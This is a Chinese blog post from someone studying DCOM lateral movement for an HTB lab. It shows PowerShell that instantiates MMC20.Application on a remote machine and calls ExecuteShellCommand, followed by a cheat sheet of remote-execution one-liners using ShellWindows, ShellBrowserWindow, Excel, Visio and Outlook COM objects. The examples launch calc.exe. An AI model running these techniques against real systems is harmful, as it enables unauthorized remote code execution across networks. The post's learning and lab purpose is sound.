---
title: DCOM学习
date: '2025-07-05 11:33:28'
permalink: /post/dcom-learning-quc1x.html
tagline: >-
  本文介绍了DCOM（分布式组件对象模型）攻击的基本原理，重点分析了利用MMC20
  COM对象进行横向移动的方法。文章通过实验环境演示了如何通过PowerShell与远程COM对象交互，并调用Document.ActiveView.ExecuteShellCommand方法在目标系统上执行命令。攻击者需具备Distributed
  COM Users组权限才能实施此类攻击。
tags:
  - dcom攻击
  - windows安全
  - 横向移动
  - com对象
categories:
  - ' 网络安全'
  - 攻击技术
  - Windows
layout: post
published: true
---



# DCOM学习

# DCOM攻击原理学习

在打htb的靶机Jab的时候，有一步需要DCOM攻击，这个知识我第一次听说，于是专门学习一下攻击原理，具体组件的使用不作考虑

## 文章

https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/

https://book.hacktricks.xyz/windows-hardening/lateral-movement/dcom-exec

## 概念

DCOM Microsoft Distributed Component Object Model 分布式组件对象模型，是一系列微软的概念和程序接口，利用这个接口，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象

## 权限要求

Distributed COM Users组员

## 自建LAB环境实验

依据文章的讲述，操作MMC20对象执行命令

查看所有COM对象

```powershell
PS C:\Users\Administrator> Get-CimInstance Win32_DCOMApplication

AppID                                  Name
-----                                  ----
{00021401-0000-0000-C000-000000000046}
{000C101C-0000-0000-C000-000000000046}
{0010890e-8789-413c-adbc-48f5b511b3af} User Notification
{00f22b16-589e-4982-a172-a51d9dcceb68} PhotoAcquire
{00f2b433-44e4-4d88-b2b0-2698a0a91dba} PhotoAcqHWEventHandler
{01419581-4d63-4d43-ac26-6e2fc976c1f3} TabTip
{01A39A4B-90E2-4EDF-8A1C-DD9E5F526568}
{01D0824E-81A6-447B-9223-167C2A78AFC8} DFSRHelper.ServerHealthReport Class
{020FB939-2C8B-4DB7-9E90-9527966E38E5} lfsvc
{03837503-098b-11d8-9414-505054503030} PLA
{03e15b2e-cca6-451c-8fb0-1e2ee37a27dd} CTapiLuaLib Class
{0450178e-e3ee-46d8-9130-c0b84f169f53} InstallServiceUserBroker
{046AEAD9-5A27-4D3C-8A67-F82552E0A91B} DevicesFlowExperienceFlow
{06622D85-6856-4460-8DE1-A81921B41C4B} COpenControlPanel
{06C792F8-6212-4F39-BF70-E8C0AC965C23} %systemroot%\System32\UserAccountControlSettings.dll
{0771f7af-8de6-4bce-9528-2d4a12cb8168} OOBE Bio Enrollment
{0868DC9B-D9A2-4f64-9362-133CEA201299} sppui
```

忽略大小写筛选服务

```powershell
PS C:\Users\Administrator> Get-CimInstance Win32_DCOMApplication|select-string -Pattern "mmc" -CaseSensitive:$false

Win32_DCOMApplication: MMC Application Class (AppID = "{7e0423cd-1119-0928-900c-e6d4a52a0715}")
```

与COM进行远程交互

```powershell
PS C:\Users\Administrator> $com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.0.0.3"))
PS C:\Users\Administrator> $com


Document     : System.__ComObject
Frame        : System.__ComObject
Visible      : 0
UserControl  : 0
VersionMajor : 3
VersionMinor : 0
```

查看对象成员

```powershell
PS C:\Users\Administrator> $com|Get-Member


   TypeName:System.__ComObject#{a3afb9cc-b653-4741-86ab-f0470ec1384c}

Name         MemberType Definition
----         ---------- ----------
Help         Method     void Help ()
Hide         Method     void Hide ()
Load         Method     void Load (string)
Quit         Method     void Quit ()
Show         Method     void Show ()
Document     Property   Document Document () {get}
Frame        Property   Frame Frame () {get}
UserControl  Property   int UserControl () {get} {set}
VersionMajor Property   int VersionMajor () {get}
VersionMinor Property   int VersionMinor () {get}
Visible      Property   int Visible () {get}
```

问题出在Document.ActiveView

![image-20240227214222678](/assets/images/network-asset-image-20240227214222678-20250930220255-ltttbfc.png)

可以很清楚地看见这里存在命令执行，微软的文档中有更多的详情信息

https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/mmc/view-executeshellcommand?redirectedfrom=MSDN

这里面有关于它四个参数的解释

![image-20240227214511690](/assets/images/network-asset-image-20240227214511690-20250930220255-2tf9in6.png)

手工执行测试一下

```powershell
$com.Document.ActiveView.ExecuteShellCommand("powershell.exe","C:\","echo 'abc' >1.txt","minimized")
```

![image-20240227215251965](/assets/images/network-asset-image-20240227215251965-20250930220256-1pezl9w.png)

命令确实在新弹出的窗口被确凿地执行了

## 常用模块

MMC20

```
$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","remote_ip"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")
//适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016
```

ShellWindows

```
$com=[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"remote_ip"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\\windows\\system32",$null,0)
//适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016
```

ShellBrowserWindow

```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","remote_ip"))
$com.Document.Application.shellExecute("calc.exe")
//适用于 Windows 10 ， Windows Server 2012 R2 等
```

Excel.Applicaiton

```
$com = [activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","remote_ip"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd.exe","/c calc.exe")
```

Visio.Application

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","remote_ip"))
$com.[0].Document.Application.shellExecute("calc.exe")
//前提是目标安装了 Visio
```

Outlook.Application

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","remote_ip"))
$com.createObject("Shell.Application").shellExecute("calc.exe")
//前提是目标安装了 Outlook
```
